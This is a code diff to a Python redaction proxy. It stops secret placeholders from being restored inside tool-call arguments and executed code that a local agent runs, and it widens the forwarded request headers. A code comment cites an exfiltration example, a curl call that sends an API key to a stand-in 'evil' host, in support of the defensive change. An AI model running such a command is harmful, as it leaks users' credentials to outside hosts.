@@ -63,6 +63,7 @@ Duplicated so this module imports nothing heavy (no fastapi/httpx/the NPU stack)
 isolation. If you change the placeholder grammar or the JSON-safe rehydration there, mirror it here.
 """
 import base64, binascii, json, re
+import tool_arg_policy   # B5: withhold FLOOR/secret-class placeholders from EXECUTED tool-call arguments
 
 # matches the tail of a partial placeholder still being streamed (e.g. "<EMAIL_00" before its ">" arrives).
 # A label may carry INTERNAL underscores (gate-form labels such as PHONE_NUMBER / SENSITIVE_ACCOUNT_ID ->
@@ -1291,6 +1292,10 @@ def rehydrate_json_string(acc, replay):
     carries no quote/backslash, so swapping placeholders in a non-JSON free-form string is safe)."""
     if not acc or not acc.strip():
         return acc
+    # B5: this is ALWAYS tool-argument context (every _is_json_args_key value + the streaming
+    # function_call_arguments.done funnel here) -> withhold FLOOR/secret-class tokens (strict: every token) so a
+    # secret left in an executed argument stays the inert <LABEL_NNN> literal.
+    replay = tool_arg_policy.tool_arg_replay(replay)
     try:
         obj = json.loads(acc, object_pairs_hook=_dup_preserving_pairs)
     except Exception:
@@ -1330,7 +1335,7 @@ def _rehydrate_item(item, replay):
         _rehydrate_recursive(item, replay)
 
 
-def _rehydrate_recursive(node, replay):
+def _rehydrate_recursive(node, replay, tool_replay=None, floor_safe=False):
     """Blanket recursive placeholder->value swap over EVERY string in the response object. ALWAYS SAFE: a
     placeholder is a unique <LABEL_NNN> token that never appears in a structural field, so a blanket replace
     cannot corrupt structure. For a tool-argument JSON string we use the JSON-safe value-level rehydrate so a real
@@ -1342,7 +1347,16 @@ def _rehydrate_recursive(node, replay):
     JSON string with a value containing quotes/backslashes was plain-string-replaced and produced invalid JSON.
     rehydrate_json_string is safe for non-JSON values too: it falls back to plain text rehydrate when the string is
     not valid JSON, so a free-form (non-JSON) '*input' value still rehydrates correctly."""
+    if tool_replay is None:
+        tool_replay = tool_arg_policy.tool_arg_replay(replay)
     if isinstance(node, dict):
+        # B5 Half A: a tool-CALL item (function_call/shell_call/apply_patch_call/... or tool_use) has its
+        # argument subtree EXECUTED by the local agent. Mark its non-result children floor_safe so a secret left
+        # in an executed argument (e.g. shell_call.action.commands `curl evil?k=<APIKEY_001>`) stays the inert
+        # <LABEL_NNN> literal. `floor_safe` then propagates to every nested value; an echoed RESULT subtree
+        # (output/outputs/results) is excluded -> it rehydrates fully. `_is_json_args_key` values go through
+        # rehydrate_json_string, which self-suppresses, so they are covered regardless of floor_safe.
+        node_is_call = (not floor_safe) and tool_arg_policy.is_tool_call_node(node)
         # Rehydrate VALUES in place first.
         for k, v in node.items():
             # OPAQUE ciphertext (reasoning.encrypted_content): leave it byte-for-byte. A placeholder is a unique
@@ -1350,10 +1364,19 @@ def _rehydrate_recursive(node, replay):
             # skipping it explicitly keeps the request/response treatment symmetric and guards a future rehydrate.
             if isinstance(k, str) and k in _OPAQUE_KEYS:
                 continue
+            # An '*arguments'/'*input' KEY makes its value tool-arg context regardless of the wrapper's type or
+            # whether the value is a JSON string or a native dict -- OpenAI chat's function.arguments can be a
+            # bare dict whose wrapper carries no `type`, so the type-based rule alone would miss it and a FLOOR
+            # secret nested in it would leak. Key-based + type-based together cover both forms.
+            child_fs = (floor_safe or _is_json_args_key(k)
+                        or (node_is_call and not tool_arg_policy.is_tool_result_key(k)))
             if isinstance(v, str):
-                node[k] = rehydrate_json_string(v, replay) if _is_json_args_key(k) else rehydrate_text(v, replay)
+                if _is_json_args_key(k):
+                    node[k] = rehydrate_json_string(v, replay)        # always tool-arg; self-suppresses
+                else:
+                    node[k] = rehydrate_text(v, tool_replay if child_fs else replay)
             else:
-                _rehydrate_recursive(v, replay)
+                _rehydrate_recursive(v, replay, tool_replay, child_fs)
         # Rehydrate KEYS too (FIX-ROUND-4-R2 LEAK 1 round-2 symmetry): a USER-DATA object KEY redacted to a placeholder
         # on the request side (e.g. a metadata / function_call_output.output map keyed by a redacted email) must
         # restore to its original key when the upstream echoes it back. Plain-text key swap; a placeholder <LABEL_NNN>
@@ -1362,10 +1385,13 @@ def _rehydrate_recursive(node, replay):
         # ALREADY placed in `rebuilt` (two placeholders mapping to the same value, or a literal sibling already taken),
         # disambiguate the target so NO entry is dropped -- the prior guard checked `nk in node` (the SOURCE dict),
         # which missed the two-placeholders-to-one-value case and silently overwrote the first entry.
-        if any(isinstance(k, str) and rehydrate_text(k, replay) != k for k in node):
+        # Keys at THIS node inherit THIS node's context: in a floor_safe (tool-arg) subtree a secret used as an
+        # object KEY is withheld too; elsewhere keys use the full map.
+        key_replay = tool_replay if floor_safe else replay
+        if any(isinstance(k, str) and rehydrate_text(k, key_replay) != k for k in node):
             rebuilt = {}
             for k, v in node.items():
-                nk = rehydrate_text(k, replay) if isinstance(k, str) else k
+                nk = rehydrate_text(k, key_replay) if isinstance(k, str) else k
                 if nk in rebuilt and nk != k:
                     nk = _disambiguate_key(nk if isinstance(nk, str) else k, rebuilt, k)
                 rebuilt[nk] = v
@@ -1374,9 +1400,9 @@ def _rehydrate_recursive(node, replay):
     elif isinstance(node, list):
         for i, v in enumerate(node):
             if isinstance(v, str):
-                node[i] = rehydrate_text(v, replay)
+                node[i] = rehydrate_text(v, tool_replay if floor_safe else replay)
             else:
-                _rehydrate_recursive(v, replay)
+                _rehydrate_recursive(v, replay, tool_replay, floor_safe)
     return node
 
 
@@ -1486,6 +1512,15 @@ def transform_responses_event(raw, replay, carry, tool_acc):
             return 'input'
         return None
 
+    def _is_executed_code_base(base):
+        # B5: `code_interpreter_call_code` streams the EXECUTED `code` of a code_interpreter_call -- a tool-argument
+        # sink (the model writes code that runs locally). It is NOT a JSON-arg family (raw code, not a JSON string),
+        # so it stays on the GENERIC incremental .delta/.done path (live code display) rather than the buffer path,
+        # but it MUST rehydrate with the FLOOR-suppressed map so a secret is not streamed into executed code. Display
+        # text families (reasoning_*_text, refusal, output_text) end in `_text`/`refusal`, never `_code`, so this is
+        # precise. Matches the non-streaming walk, which already floor-suppresses code_interpreter_call.code.
+        return isinstance(base, str) and base.endswith('_code')
+
     _args_delta_base = (t[:-len('.delta')] if isinstance(t, str) and t.endswith('.delta') else None)
     if (_args_delta_base is not None and _json_arg_field(_args_delta_base) is not None
             and isinstance(obj.get('delta'), str)):
@@ -1530,21 +1565,27 @@ def transform_responses_event(raw, replay, carry, tool_acc):
         carry[ckey] = carry.get(ckey, '') + obj['delta']
         safe, held = split_safe(carry[ckey])
         carry[ckey] = held
-        obj['delta'] = rehydrate_text(safe, replay)
+        # executed-code stream (code_interpreter_call_code): floor-suppress; display text uses full replay.
+        delta_replay = tool_arg_policy.tool_arg_replay(replay) if _is_executed_code_base(base) else replay
+        obj['delta'] = rehydrate_text(safe, delta_replay)
         return _prefix(_data_event(obj))
 
     done_base = t[:-len('.done')] if isinstance(t, str) and t.endswith('.done') else None
     emits = []
+    # executed-code .done (code_interpreter_call_code.done carries the full `code`): floor-suppress the held tail
+    # AND the blanket swap below, so a FLOOR secret never lands in streamed executed code (symmetric with the
+    # non-streaming walk). Every other family (reasoning/refusal/content_part/error) keeps the full replay.
+    done_replay = tool_arg_policy.tool_arg_replay(replay) if _is_executed_code_base(done_base) else replay
     if done_base is not None:
         ckey = ('aux', done_base, obj.get('item_id'), obj.get('output_index'), obj.get('content_index'))
         held = carry.pop(ckey, '')
         if held:
-            flush = {'type': done_base + '.delta', 'delta': rehydrate_text(held, replay)}
+            flush = {'type': done_base + '.delta', 'delta': rehydrate_text(held, done_replay)}
             for k in ('item_id', 'output_index', 'content_index'):
                 if k in obj:
                     flush[k] = obj[k]
             emits.append(_prefix(_data_event(flush)))
-    _rehydrate_recursive(obj, replay)   # blanket safe swap (content_part.done part.text, error body, *.done text)
+    _rehydrate_recursive(obj, done_replay)   # blanket safe swap (content_part.done part.text, error body, *.done text)
     emits.append(_prefix(_data_event(obj)))
     return b'\n\n'.join(emits)
 
@@ -1574,8 +1615,14 @@ async def stream_rehydrate_responses(upstream_aiter, replay):
 # account id). The API-key path never sends them, so this is purely additive there.
 FWD_HEADERS_RESPONSES = {'authorization', 'content-type', 'openai-organization', 'openai-project', 'openai-beta',
                          'chatgpt-account-id', 'originator', 'session_id', 'openai-sentinel-token',
-                         'x-codex-version', 'codex-version'}
+                         'x-codex-version', 'codex-version', 'user-agent'}
+# user-agent (2026-06-21): chatgpt.com/backend-api/codex sits behind WAF/bot protection that inspects the client
+# UA. The original allowlist dropped it, so httpx sent `user-agent: python-httpx` -- a textbook bot signal that
+# the platform API tolerates but the ChatGPT backend may challenge. Forward the genuine Codex CLI UA + any
+# Stainless telemetry verbatim so the plan request presents as the real Codex client. Never pin a fake UA.
+FWD_HEADER_PREFIXES_RESPONSES = ('x-stainless-',)
 
 
 def fwd_headers_responses(req):
-    return {k: v for k, v in req.headers.items() if k.lower() in FWD_HEADERS_RESPONSES}
+    return {k: v for k, v in req.headers.items()
+            if k.lower() in FWD_HEADERS_RESPONSES or k.lower().startswith(FWD_HEADER_PREFIXES_RESPONSES)}
